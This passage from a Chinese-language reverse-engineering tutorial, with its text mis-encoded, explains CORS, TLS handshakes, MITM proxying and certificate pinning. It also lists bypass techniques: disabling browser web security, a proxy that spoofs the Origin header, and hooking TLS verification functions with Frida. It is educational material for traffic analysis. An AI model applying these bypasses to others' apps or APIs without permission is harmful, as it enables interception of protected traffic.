        <li><strong>AJAX</strong> è¯·æ±‚å‘é€ (å®é™…ä¸Šè¯·æ±‚é€šå¸¸èƒ½å‘å‡ºï¼Œä½†å“åº”ä¼šè¢«æµè§ˆå™¨æ‹¦æˆªï¼Œé™¤éæœåŠ¡å™¨å…è®¸ CORS)ã€‚</li>
      </ul>

      <h3 id="2-reverse-engineering-context-ä¸ºä»€ä¹ˆæˆ‘çš„æœ¬åœ°æµ‹è¯•å¤±è´¥äº†">2. [Reverse Engineering Context] ä¸ºä»€ä¹ˆæˆ‘çš„æœ¬åœ°æµ‹è¯•å¤±è´¥äº†ï¼Ÿ</h3>

      <p>å¾ˆå¤šæ—¶å€™ï¼Œä½ æŠŠåˆ«äººçš„ JS ä»£ç  down ä¸‹æ¥ï¼Œåœ¨æœ¬åœ°å¼€ä¸ª <code>file://</code> æˆ– <code>localhost:8000</code> è¿è¡Œï¼Œç»“æœå‘ç° API è¯·æ±‚å…¨éƒ½æŠ¥çº¢ï¼š<br />
        <code>Access to fetch at ... from origin ... has been blocked by CORS policy</code>ã€‚
      </p>

      <p><strong>åŸå› </strong>: ç›®æ ‡æœåŠ¡å™¨åªå…è®¸ç‰¹å®šçš„åŸŸåï¼ˆå®ƒçš„å®˜ç½‘ï¼‰è®¿é—®ï¼Œä½ çš„ <code>localhost</code> ä¸æ˜¯å®ƒå…è®¸çš„æºã€‚</p>

      <hr />

      <h2 id="cors-è·¨åŸŸèµ„æºå…±äº«">CORS (è·¨åŸŸèµ„æºå…±äº«)</h2>

      <p>CORS æ˜¯ä¸€ç§æœºåˆ¶ï¼Œå®ƒä½¿ç”¨é¢å¤–çš„ HTTP å¤´æ¥å‘Šè¯‰æµè§ˆå™¨ï¼šè®©è¿è¡Œåœ¨ä¸€ä¸ª origin (domain) ä¸Šçš„ Web åº”ç”¨è¢«å‡†è®¸è®¿é—®æ¥è‡ªä¸åŒæºæœåŠ¡å™¨ä¸Šçš„æŒ‡å®šçš„èµ„æºã€‚</p>

      <h3 id="1-ç®€å•è¯·æ±‚-vs-é¢„æ£€è¯·æ±‚">1. ç®€å•è¯·æ±‚ vs é¢„æ£€è¯·æ±‚</h3>

      <ul>
        <li>
          <p><strong>ç®€å•è¯·æ±‚</strong>: (GET, POST, HEAD, ä¸” Content-Type æ˜¯ application/x-www-form-urlencoded,
            multipart/form-data, text/plain ä¹‹ä¸€)ã€‚</p>

          <ul>
            <li>æµè§ˆå™¨ç›´æ¥å‘è¯·æ±‚ã€‚</li>
            <li>çœ‹å“åº”å¤´æœ‰æ²¡æœ‰ <code>Access-Control-Allow-Origin</code>ã€‚</li>
          </ul>
        </li>
        <li>
          <p><strong>é¢„æ£€è¯·æ±‚ (Preflight)</strong>: (å¸¦è‡ªå®šä¹‰ Header, æˆ– Content-Type æ˜¯ application/json ç­‰)ã€‚</p>

          <ul>
            <li>æµè§ˆå™¨å…ˆå‘ä¸€ä¸ª <code>OPTIONS</code> æ–¹æ³•çš„è¯·æ±‚ã€‚</li>
            <li>æœåŠ¡å™¨åŒæ„äº† (<code>Access-Control-Allow-Methods</code>,
              <code>Access-Control-Allow-Headers</code>)ï¼Œæµè§ˆå™¨æ‰å‘çœŸæ­£çš„è¯·æ±‚ã€‚</li>
          </ul>
        </li>
      </ul>

      <h3 id="2-å…³é”®å“åº”å¤´">2. å…³é”®å“åº”å¤´</h3>

      <ul>
        <li><code>Access-Control-Allow-Origin</code>: <code>*</code> æˆ– <code>https://your-site.com</code>ã€‚</li>
        <li><code>Access-Control-Allow-Credentials</code>: <code>true</code> (å…è®¸å¸¦ Cookie)ã€‚</li>
      </ul>

      <hr />

      <h2 id="é€†å‘ä¸­çš„-cors-ç»•è¿‡æŠ€å·§">é€†å‘ä¸­çš„ CORS ç»•è¿‡æŠ€å·§</h2>

      <p>å½“ä½ éœ€è¦æœ¬åœ°è°ƒè¯•ç›®æ ‡ç½‘ç«™çš„ APIï¼Œæˆ–è€…åœ¨è‡ªå·±çš„ç½‘ç«™ä¸Šè°ƒç”¨åˆ«äººçš„ API æ—¶ï¼Œå¿…é¡»å¤„ç† CORSã€‚</p>

      <h3 id="1-æµè§ˆå™¨æ’ä»¶-å¯åŠ¨å‚æ•°">1. æµè§ˆå™¨æ’ä»¶ / å¯åŠ¨å‚æ•°</h3>

      <p>æœ€ç®€å•çš„æ–¹æ³•æ˜¯å…³æ‰æµè§ˆå™¨çš„å®‰å…¨ç­–ç•¥ï¼ˆä»…é™è°ƒè¯•ç”¨ï¼ï¼‰ã€‚</p>

      <ul>
        <li><strong>Chrome å¯åŠ¨å‚æ•°</strong>: <code>--disable-web-security --user-data-dir="/tmp/xxxx"</code>ã€‚</li>
      </ul>

      <h3 id="2-é…ç½®åå‘ä»£ç†-reverse-proxy">2. é…ç½®åå‘ä»£ç† (Reverse Proxy)</h3>

      <p>è¿™æ˜¯æœ€ç¨³å¥çš„æ–¹æ³•ã€‚ä½¿ç”¨ Nginx æˆ– Node.js ä¸­é—´ä»¶ï¼ŒæŠŠä½ çš„è¯·æ±‚â€œä¼ªè£…â€æˆåŒæºã€‚</p>

      <p><strong>åœºæ™¯</strong>:</p>

      <ul>
        <li>æœ¬åœ°å¼€å‘ç¯å¢ƒ: <code>localhost:3000</code></li>
        <li>ç›®æ ‡ API: <code>api.target.com</code></li>
      </ul>

      <p><strong>Node.js ä»£ç† (http-proxy-middleware)</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ä½ å‘ç»™ localhost:3000/api/xxx</span>
<span class="c1">// ä»£ç†è½¬å‘ç»™ api.target.com/api/xxx</span>
<span class="c1">// å¹¶åœ¨è½¬å‘æ—¶ä¿®æ”¹ Origin å¤´ï¼Œæ¬ºéª—æœåŠ¡å™¨</span>
<span class="nx">pathRewrite</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="s1">&#39;^/api&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">},</span>
<span class="nx">changeOrigin</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w"> </span><span class="c1">// å…³é”®ï¼šæŠŠè¯·æ±‚å¤´ä¸­çš„ Host/Origin ä¿®æ”¹ä¸ºç›®æ ‡åŸŸå</span>
</code></pre>
      </div>

      <h3 id="3-jsonp-è¿‡æ—¶ä½†ä»å­˜åœ¨">3. JSONP (è¿‡æ—¶ä½†ä»å­˜åœ¨)</h3>

      <p>è€æ—§çš„è·¨åŸŸæ–¹æ¡ˆï¼Œåˆ©ç”¨ <code>&lt;script&gt;</code> æ ‡ç­¾ä¸å— SOP é™åˆ¶çš„ç‰¹æ€§ã€‚</p>

      <ul>
        <li><strong>ç‰¹å¾</strong>: URL é‡Œæœ‰ä¸ª <code>callback=xxx</code>ã€‚</li>
        <li><strong>é€†å‘</strong>: ç›´æ¥æŠŠ URL é‡Œçš„ callback æ”¹æˆä½ è‡ªå·±çš„å‡½æ•°åï¼Œæˆ–è€…ç›´æ¥è¯·æ±‚æ‹¿åˆ° JS ä»£ç é‡Œé¢å°±æ˜¯æ•°æ®ã€‚</li>
      </ul>

      <hr />

      <h2 id="æ€»ç»“">æ€»ç»“</h2>

      <p>SOP æ˜¯æµè§ˆå™¨çš„â€œå›´å¢™â€ï¼ŒCORS æ˜¯å¢™ä¸Šçš„â€œé—¨â€ã€‚</p>

      <ul>
        <li><strong>æ­£å‘å¼€å‘</strong>: é…ç½®æœåŠ¡å™¨å¼€é—¨ã€‚</li>
        <li><strong>é€†å‘åˆ†æ</strong>: æ—¢ç„¶å¢™æ˜¯æµè§ˆå™¨å»ºçš„ï¼Œé‚£ä¸ç®¡æ˜¯å…³æ‰æµè§ˆå™¨çš„å¢™ï¼ˆå¯åŠ¨å‚æ•°ï¼‰ï¼Œè¿˜æ˜¯éª—æœåŠ¡å™¨æˆ‘æ˜¯è‡ªå·±äººï¼ˆä»£ç†ä¿®æ”¹ Originï¼‰ï¼Œç›®æ ‡éƒ½æ˜¯ä¸ºäº†è®©æ•°æ®æµé€šã€‚</li>
      </ul>

    </div>

    <div class="section" id="01-Foundations-tls-ssl-handshake">
      <h2>13. TLS/SSL Handshake</h2>
      <h1 id="tlsssl-æ¡æ‰‹è¿‡ç¨‹">TLS/SSL æ¡æ‰‹è¿‡ç¨‹</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>åœ¨ HTTPS é€šä¿¡ä¸­ï¼ŒTLS/SSL æ¡æ‰‹æ˜¯å»ºç«‹å®‰å…¨è¿æ¥çš„ç¬¬ä¸€ä¸ªç¯èŠ‚ã€‚å¯¹äºé€†å‘å·¥ç¨‹ï¼Œç†è§£æ¡æ‰‹è¿‡ç¨‹æ˜¯ç ´è§£ SSL Pinningï¼ˆè¯ä¹¦å›ºå®šï¼‰å’Œè¿›è¡Œæµé‡è§£å¯†ï¼ˆMITMï¼‰çš„åŸºç¡€ã€‚</p>

      <hr />

      <h2 id="tls-12-æ¡æ‰‹æµç¨‹è¯¦ç»†">TLS 1.2 æ¡æ‰‹æµç¨‹ï¼ˆè¯¦ç»†ï¼‰</h2>

      <h3 id="æ¡æ‰‹åºåˆ—å›¾">æ¡æ‰‹åºåˆ—å›¾</h3>

      <pre><code>sequenceDiagram
    participant Client as å®¢æˆ·ç«¯
    participant Server as æœåŠ¡å™¨

    Note over Client,Server: é˜¶æ®µ 1: åå•†åŠ å¯†å‚æ•°
    Client-&gt;&gt;Server: 1. Client Hello&lt;br/&gt;- TLS ç‰ˆæœ¬&lt;br/&gt;- åŠ å¯†å¥—ä»¶åˆ—è¡¨&lt;br/&gt;- å®¢æˆ·ç«¯éšæœºæ•° (Random1)&lt;br/&gt;- SNI æ‰©å±•

    Server-&gt;&gt;Client: 2. Server Hello&lt;br/&gt;- é€‰æ‹©çš„åŠ å¯†å¥—ä»¶&lt;br/&gt;- æœåŠ¡å™¨éšæœºæ•° (Random2)
    Server-&gt;&gt;Client: 3. Certificate&lt;br/&gt;- æœåŠ¡å™¨è¯ä¹¦é“¾
    Server-&gt;&gt;Client: 4. Server Hello Done

    Note over Client,Server: é˜¶æ®µ 2: å¯†é’¥äº¤æ¢ä¸éªŒè¯
    Note over Client: éªŒè¯æœåŠ¡å™¨è¯ä¹¦&lt;br/&gt;- æ£€æŸ¥è¯ä¹¦é“¾&lt;br/&gt;- éªŒè¯ç­¾å&lt;br/&gt;- æ£€æŸ¥æœ‰æ•ˆæœŸ

    Note over Client: ç”Ÿæˆ Pre-Master Secret
    Client-&gt;&gt;Server: 5. Client Key Exchange&lt;br/&gt;- ç”¨æœåŠ¡å™¨å…¬é’¥åŠ å¯†çš„&lt;br/&gt;Pre-Master Secret

    Note over Client: è®¡ç®— Master Secret&lt;br/&gt;= f(Random1, Random2,&lt;br/&gt;Pre-Master Secret)
    Note over Server: è§£å¯† Pre-Master Secret&lt;br/&gt;è®¡ç®— Master Secret

    Client-&gt;&gt;Server: 6. Change Cipher Spec&lt;br/&gt;- é€šçŸ¥åˆ‡æ¢åˆ°åŠ å¯†æ¨¡å¼
    Client-&gt;&gt;Server: 7. Finished (åŠ å¯†)&lt;br/&gt;- æ¡æ‰‹æ¶ˆæ¯çš„ HMAC

    Server-&gt;&gt;Client: 8. Change Cipher Spec
    Server-&gt;&gt;Client: 9. Finished (åŠ å¯†)

    Note over Client,Server: é˜¶æ®µ 3: åŠ å¯†é€šä¿¡
    Client-&gt;&gt;Server: Application Data (åŠ å¯†)
    Server-&gt;&gt;Client: Application Data (åŠ å¯†)
</code></pre>

      <h3 id="1-åå•†é˜¶æ®µ-hello">1. åå•†é˜¶æ®µ (Hello)</h3>

      <ul>
        <li><strong>Client Hello</strong>: å®¢æˆ·ç«¯å‘é€æ”¯æŒçš„åŠ å¯†å¥—ä»¶ (Cipher Suites)ã€TLS ç‰ˆæœ¬ã€éšæœºæ•° (Random1) ä»¥åŠæ‰©å±•å­—æ®µï¼ˆå¦‚ SNI æŒ‡æ˜åŸŸåï¼‰ã€‚
          <ul>
            <li><strong>JA3 æŒ‡çº¹</strong>: è¿™é‡Œçš„ Client Hello ç‰¹å¾ï¼ˆåŠ å¯†å¥—ä»¶é¡ºåºã€æ‰©å±•å­—æ®µç­‰ï¼‰å¸¸è¢«ç”¨äºè¯†åˆ«å®¢æˆ·ç«¯æŒ‡çº¹ï¼ˆJA3ï¼‰ï¼Œç”¨äºåçˆ¬è™«ã€‚</li>
          </ul>
        </li>
        <li><strong>Server Hello</strong>: æœåŠ¡å™¨é€‰æ‹©ä¸€ç»„åŠ å¯†å¥—ä»¶ï¼Œå‘é€è‡ªå·±çš„éšæœºæ•° (Random2) å’Œ <strong>æ•°å­—è¯ä¹¦</strong>ã€‚</li>
      </ul>

      <h3 id="2-éªŒè¯ä¸å¯†é’¥äº¤æ¢-key-exchange">2. éªŒè¯ä¸å¯†é’¥äº¤æ¢ (Key Exchange)</h3>

      <ul>
        <li><strong>è¯ä¹¦éªŒè¯</strong>: å®¢æˆ·ç«¯éªŒè¯æœåŠ¡å™¨å‘æ¥çš„è¯ä¹¦æ˜¯å¦å¯ä¿¡ï¼ˆæ ¡éªŒè¯ä¹¦é“¾ã€ç­¾åã€æœ‰æ•ˆæœŸï¼‰ã€‚</li>
        <li><strong>å¯†é’¥ç”Ÿæˆ</strong>: å®¢æˆ·ç«¯ç”Ÿæˆ"é¢„ä¸»å¯†é’¥&#8221; (Pre-Master Secret)ï¼Œç”¨æœåŠ¡å™¨è¯ä¹¦ä¸­çš„å…¬é’¥åŠ å¯†åå‘é€ç»™æœåŠ¡å™¨ã€‚
          <ul>
            <li>_æ³¨_: åœ¨ TLS 1.3 æˆ–ä½¿ç”¨äº† PFS (å®Œç¾å‰å‘ä¿å¯†) çš„ç®—æ³•ä¸­ï¼Œå¯†é’¥äº¤æ¢æœºåˆ¶æ›´å¤æ‚ï¼ˆDiffie-Hellmanï¼‰ï¼Œä¸ç›´æ¥ä¼ è¾“å¯†é’¥ã€‚</li>
          </ul>
        </li>
      </ul>

      <h3 id="3-åŠ å¯†é€šä¿¡-finished">3. åŠ å¯†é€šä¿¡ (Finished)</h3>

      <ul>
        <li>åŒæ–¹åˆ©ç”¨ Random1 + Random2 + Pre-Master Secret è®¡ç®—å‡ºæœ€ç»ˆçš„ <strong>Session Key</strong>ã€‚</li>
        <li>åç»­æ•°æ®å…¨éƒ¨ç”¨ Session Key è¿›è¡Œå¯¹ç§°åŠ å¯†ä¼ è¾“ã€‚</li>
      </ul>

      <hr />

      <h2 id="tls-13-æ¡æ‰‹æµç¨‹ç®€åŒ–">TLS 1.3 æ¡æ‰‹æµç¨‹ï¼ˆç®€åŒ–ï¼‰</h2>

      <p>TLS 1.3 å¤§å¹…ç®€åŒ–äº†æ¡æ‰‹è¿‡ç¨‹ï¼Œå‡å°‘äº†å¾€è¿”æ¬¡æ•°ï¼ˆ1-RTTï¼‰ï¼š</p>

      <pre><code>sequenceDiagram
    participant Client as å®¢æˆ·ç«¯
    participant Server as æœåŠ¡å™¨

    Note over Client,Server: TLS 1.3: 1-RTT æ¡æ‰‹

    Client-&gt;&gt;Server: Client Hello&lt;br/&gt;- æ”¯æŒçš„åŠ å¯†å¥—ä»¶&lt;br/&gt;- å¯†é’¥å…±äº« (Key Share)&lt;br/&gt;- å®¢æˆ·ç«¯éšæœºæ•°&lt;br/&gt;- SNI æ‰©å±•

    Note over Server: é€‰æ‹©åŠ å¯†å¥—ä»¶&lt;br/&gt;è®¡ç®—å…±äº«å¯†é’¥&lt;br/&gt;ç”Ÿæˆä¼šè¯å¯†é’¥

    Server-&gt;&gt;Client: Server Hello&lt;br/&gt;- é€‰æ‹©çš„åŠ å¯†å¥—ä»¶&lt;br/&gt;- å¯†é’¥å…±äº« (Key Share)&lt;br/&gt;- æœåŠ¡å™¨éšæœºæ•°
    Server-&gt;&gt;Client: {Encrypted Extensions}&lt;br/&gt;{Certificate}&lt;br/&gt;{Certificate Verify}&lt;br/&gt;{Finished}

    Note over Client: éªŒè¯è¯ä¹¦&lt;br/&gt;è®¡ç®—å…±äº«å¯†é’¥&lt;br/&gt;ç”Ÿæˆä¼šè¯å¯†é’¥

    Client-&gt;&gt;Server: {Finished}

    Note over Client,Server: å¼€å§‹åŠ å¯†é€šä¿¡
    Client-&gt;&gt;Server: {Application Data}
    Server-&gt;&gt;Client: {Application Data}
</code></pre>

      <p><strong>TLS 1.3 ä¸»è¦æ”¹è¿›</strong>:</p>

      <ul>
        <li><strong>1-RTT</strong>: åªéœ€ä¸€æ¬¡å¾€è¿”å³å¯å»ºç«‹åŠ å¯†è¿æ¥ï¼ˆTLS 1.2 éœ€è¦ 2-RTTï¼‰</li>
        <li><strong>0-RTT</strong>: æ¢å¤ä¼šè¯æ—¶å¯å®ç°é›¶å¾€è¿”ï¼ˆä½†æœ‰é‡æ”¾æ”»å‡»é£é™©ï¼‰</li>
        <li><strong>å¯†é’¥äº¤æ¢</strong>: ä»…æ”¯æŒ PFS (å®Œç¾å‰å‘ä¿å¯†) ç®—æ³•ï¼Œå¦‚ ECDHE</li>
        <li><strong>å»é™¤å¼±åŠ å¯†</strong>: ç§»é™¤ RSA å¯†é’¥äº¤æ¢ã€é™æ€ DH ç­‰ä¸å®‰å…¨ç®—æ³•</li>
      </ul>

      <hr />

      <h2 id="é€†å‘ä¸­çš„å…³é”®ç‚¹">é€†å‘ä¸­çš„å…³é”®ç‚¹</h2>

      <h3 id="1-ä¸ºä»€ä¹ˆ-charlesfiddler-æŠ“ä¸åˆ°-https-åŒ…">1. ä¸ºä»€ä¹ˆ Charles/Fiddler æŠ“ä¸åˆ° HTTPS åŒ…ï¼Ÿ</h3>

      <p>å› ä¸ºä¸­é—´äººï¼ˆCharlesï¼‰å‘ç»™å®¢æˆ·ç«¯çš„æ˜¯ Charles è‡ªå·±ç­¾å‘çš„ä¼ªé€ è¯ä¹¦ã€‚</p>

      <ul>
        <li>å¦‚æœå®¢æˆ·ç«¯ï¼ˆAPP/æµè§ˆå™¨ï¼‰ä¸ä¿¡ä»» Charles çš„æ ¹è¯ä¹¦ï¼Œæ¡æ‰‹å°±ä¼šåœ¨"è¯ä¹¦éªŒè¯"é˜¶æ®µå¤±è´¥ï¼Œè¿æ¥æ–­å¼€ã€‚</li>
      </ul>

      <h4 id="mitm-æ”»å‡»åŸç†å›¾">MITM æ”»å‡»åŸç†å›¾</h4>

      <pre><code>sequenceDiagram
    participant Client as å®¢æˆ·ç«¯&lt;br/&gt;(APP/æµè§ˆå™¨)
    participant Proxy as ä¸­é—´äººä»£ç†&lt;br/&gt;(Charles/Burp)
    participant Server as ç›®æ ‡æœåŠ¡å™¨

    Note over Client,Server: æ­£å¸¸ HTTPS è¿æ¥ï¼ˆæ— ä»£ç†ï¼‰
    Client-&gt;&gt;Server: ç›´æ¥å»ºç«‹ TLS è¿æ¥
    Server-&gt;&gt;Client: è¿”å›çœŸå®æœåŠ¡å™¨è¯ä¹¦
    Note over Client: éªŒè¯é€šè¿‡ï¼Œå»ºç«‹åŠ å¯†è¿æ¥

    Note over Client,Server: MITM æ”»å‡»åœºæ™¯
    Client-&gt;&gt;Proxy: Client Hello (è®¿é—® api.example.com)
    Proxy-&gt;&gt;Server: è½¬å‘ Client Hello
    Server-&gt;&gt;Proxy: Server Hello + çœŸå®è¯ä¹¦

    Note over Proxy: ç”Ÿæˆä¼ªé€ è¯ä¹¦&lt;br/&gt;- ç­¾å‘è€…: Charles CA&lt;br/&gt;- ä¸»é¢˜: api.example.com

    Proxy-&gt;&gt;Client: è¿”å›ä¼ªé€ è¯ä¹¦

    alt å®¢æˆ·ç«¯æœªä¿¡ä»» Charles CA
        Note over Client: âŒ è¯ä¹¦éªŒè¯å¤±è´¥&lt;br/&gt;è¿æ¥ä¸­æ–­
    else å®¢æˆ·ç«¯å·²ä¿¡ä»» Charles CA
        Note over Client: âœ… è¯ä¹¦éªŒè¯é€šè¿‡&lt;br/&gt;å»ºç«‹åŠ å¯†è¿æ¥
        Client-&gt;&gt;Proxy: åŠ å¯†æ•°æ® (ç”¨ä¼ªé€ è¯ä¹¦å…¬é’¥)
        Note over Proxy: ğŸ”“ è§£å¯†å®¢æˆ·ç«¯æ•°æ®&lt;br/&gt;ğŸ” æŸ¥çœ‹/ä¿®æ”¹&lt;br/&gt;ğŸ”’ é‡æ–°åŠ å¯†
        Proxy-&gt;&gt;Server: è½¬å‘åˆ°æœåŠ¡å™¨ (ç”¨çœŸå®è¯ä¹¦)
        Server-&gt;&gt;Proxy: åŠ å¯†å“åº”
        Note over Proxy: ğŸ”“ è§£å¯†æœåŠ¡å™¨å“åº”&lt;br/&gt;ğŸ” æŸ¥çœ‹/ä¿®æ”¹&lt;br/&gt;ğŸ”’ é‡æ–°åŠ å¯†
        Proxy-&gt;&gt;Client: è¿”å›ç»™å®¢æˆ·ç«¯
    end
</code></pre>

      <h3 id="2-certificate-pinning-è¯ä¹¦å›ºå®š">2. Certificate Pinning (è¯ä¹¦å›ºå®š)</h3>

      <p>ä¸ºäº†é˜²æ­¢ä¸­é—´äººæ”»å‡»ï¼Œè®¸å¤š APP å†…ç½®äº†æœåŠ¡å™¨è¯ä¹¦çš„æŒ‡çº¹ï¼ˆHashï¼‰ï¼Œåœ¨ TLS æ¡æ‰‹æ—¶ï¼Œä¸ä»…éªŒè¯è¯ä¹¦æ˜¯å¦å¯ä¿¡ï¼Œè¿˜è¦æ¯”å¯¹å…¬é’¥ Hash æ˜¯å¦ä¸å†…ç½®çš„ä¸€è‡´ã€‚å¦‚æœä»…ä»…åœ¨ç³»ç»Ÿä¸­å®‰è£…äº† Charles è¯ä¹¦ï¼ŒAPP å‘ç° Hash
        ä¸åŒ¹é…ï¼Œä¾ç„¶ä¼šæŠ¥é”™ã€‚</p>

      <h4 id="certificate-pinning-éªŒè¯æµç¨‹">Certificate Pinning éªŒè¯æµç¨‹</h4>

      <pre><code>flowchart TD
    A[å¼€å§‹ TLS æ¡æ‰‹] --&gt; B[æ¥æ”¶æœåŠ¡å™¨è¯ä¹¦]
    B --&gt; C{ç³»ç»Ÿè¯ä¹¦é“¾éªŒè¯}
    C --&gt;|å¤±è´¥| D[âŒ è¿æ¥å¤±è´¥]
    C --&gt;|é€šè¿‡| E{Certificate Pinning&lt;br/&gt;å¯ç”¨?}

    E --&gt;|æœªå¯ç”¨| F[âœ… å»ºç«‹è¿æ¥]
    E --&gt;|å·²å¯ç”¨| G[æå–è¯ä¹¦å…¬é’¥]

    G --&gt; H[è®¡ç®—å…¬é’¥ Hash&lt;br/&gt;SHA256/SHA1]
    H --&gt; I{Hash æ˜¯å¦åŒ¹é…&lt;br/&gt;å†…ç½®æŒ‡çº¹?}

    I --&gt;|åŒ¹é…| F
    I --&gt;|ä¸åŒ¹é…| J[âŒ Pinning éªŒè¯å¤±è´¥&lt;br/&gt;è¿æ¥ä¸­æ–­]

    style D fill:#ff6b6b
    style F fill:#51cf66
    style J fill:#ff6b6b
</code></pre>

      <h4 id="pinning-å®ç°ç¤ºä¾‹">Pinning å®ç°ç¤ºä¾‹</h4>

      <p><strong>Android (OkHttp)</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// å†…ç½®è¯ä¹¦å…¬é’¥ Hash</span>
<span class="n">CertificatePinner</span><span class="w"> </span><span class="n">certificatePinner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">CertificatePinner</span><span class="p">.</span><span class="na">Builder</span><span class="p">()</span>
<span class="w">    </span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="s">&quot;api.example.com&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=&quot;</span><span class="p">)</span>
<span class="w">    </span><span class="p">.</span><span class="na">build</span><span class="p">();</span>

<span class="n">OkHttpClient</span><span class="w"> </span><span class="n">client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">OkHttpClient</span><span class="p">.</span><span class="na">Builder</span><span class="p">()</span>
<span class="w">    </span><span class="p">.</span><span class="na">certificatePinner</span><span class="p">(</span><span class="n">certificatePinner</span><span class="p">)</span>
<span class="w">    </span><span class="p">.</span><span class="na">build</span><span class="p">();</span>
</code></pre>
      </div>

      <p><strong>iOS (Swift)</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">func</span><span class="w"> </span><span class="nf">urlSession</span><span class="p">(</span><span class="kc">_</span><span class="w"> </span><span class="n">session</span><span class="p">:</span><span class="w"> </span><span class="n">URLSession</span><span class="p">,</span>
<span class="w">                </span><span class="n">didReceive</span><span class="w"> </span><span class="n">challenge</span><span class="p">:</span><span class="w"> </span><span class="n">URLAuthenticationChallenge</span><span class="p">,</span>
<span class="w">                </span><span class="n">completionHandler</span><span class="p">:</span><span class="w"> </span><span class="p">@</span><span class="n">escaping</span><span class="w"> </span><span class="p">(</span><span class="n">URLSession</span><span class="p">.</span><span class="n">AuthChallengeDisposition</span><span class="p">,</span><span class="w"> </span><span class="n">URLCredential</span><span class="p">?)</span><span class="w"> </span><span class="p">-&gt;</span><span class="w"> </span><span class="nb">Void</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>

<span class="w">    </span><span class="k">guard</span><span class="w"> </span><span class="kd">let</span><span class="w"> </span><span class="nv">serverTrust</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">challenge</span><span class="p">.</span><span class="n">protectionSpace</span><span class="p">.</span><span class="n">serverTrust</span><span class="p">,</span>
<span class="w">          </span><span class="kd">let</span><span class="w"> </span><span class="nv">certificate</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">SecTrustGetCertificateAtIndex</span><span class="p">(</span><span class="n">serverTrust</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">completionHandler</span><span class="p">(.</span><span class="n">cancelAuthenticationChallenge</span><span class="p">,</span><span class="w"> </span><span class="kc">nil</span><span class="p">)</span>
<span class="w">        </span><span class="k">return</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// è®¡ç®—å…¬é’¥ Hash</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nv">serverPublicKeyHash</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">sha256</span><span class="p">(</span><span class="n">certificate</span><span class="p">)</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nv">pinnedHash</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=&quot;</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">serverPublicKeyHash</span><span class="w"> </span><span class="p">==</span><span class="w"> </span><span class="n">pinnedHash</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">completionHandler</span><span class="p">(.</span><span class="n">useCredential</span><span class="p">,</span><span class="w"> </span><span class="n">URLCredential</span><span class="p">(</span><span class="n">trust</span><span class="p">:</span><span class="w"> </span><span class="n">serverTrust</span><span class="p">))</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">completionHandler</span><span class="p">(.</span><span class="n">cancelAuthenticationChallenge</span><span class="p">,</span><span class="w"> </span><span class="kc">nil</span><span class="p">)</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h4 id="reverse-engineering-context-ç»•è¿‡-pinning">[Reverse Engineering Context] ç»•è¿‡ Pinning</h4>

      <p>Pinning é€»è¾‘é€šå¸¸åœ¨ç½‘ç»œåº“ï¼ˆOkHttp, AFNetworkingï¼‰æˆ– Native å±‚ï¼ˆOpenSSL, BoringSSLï¼‰çš„å›è°ƒä¸­ã€‚</p>

      <pre><code>flowchart TD
    A[è¯†åˆ« Pinning æœºåˆ¶] --&gt; B{Pinning å±‚çº§}

    B --&gt;|Java/Kotlin å±‚| C[Hook ç½‘ç»œåº“]
    B --&gt;|Native å±‚| D[Hook SSL åº“]
    B --&gt;|å¤šå±‚é˜²æŠ¤| E[ç»„åˆç»•è¿‡]

    C --&gt; C1[æ–¹æ¡ˆ 1: Hook TrustManager]
    C1 --&gt; C1A["Hook checkServerTrusted()&lt;br/&gt;ç›´æ¥è¿”å› true"]

    C --&gt; C2[æ–¹æ¡ˆ 2: Hook OkHttp]
    C2 --&gt; C2A["Hook CertificatePinner.check()&lt;br/&gt;è·³è¿‡éªŒè¯"]

    D --&gt; D1[æ–¹æ¡ˆ 3: Hook OpenSSL]
    D1 --&gt; D1A["Hook SSL_CTX_set_verify()&lt;br/&gt;ç¦ç”¨éªŒè¯å›è°ƒ"]

    D --&gt; D2[æ–¹æ¡ˆ 4: Hook BoringSSL]
    D2 --&gt; D2A["Hook ssl_verify_peer_cert()&lt;br/&gt;å¼ºåˆ¶è¿”å›æˆåŠŸ"]

    E --&gt; E1[Frida å¤šç‚¹ Hook]
    E1 --&gt; E1A[åŒæ—¶ Hook Java + Native å±‚]

    C1A --&gt; F[âœ… ç»•è¿‡æˆåŠŸ]
    C2A --&gt; F
    D1A --&gt; F
    D2A --&gt; F
    E1A --&gt; F

    style F fill:#51cf66
</code></pre>

      <p><strong>ç»•è¿‡æ–¹æ³•</strong>:</p>

      <ul>
        <li>
          <p><strong>Android (Java å±‚)</strong>:<br />
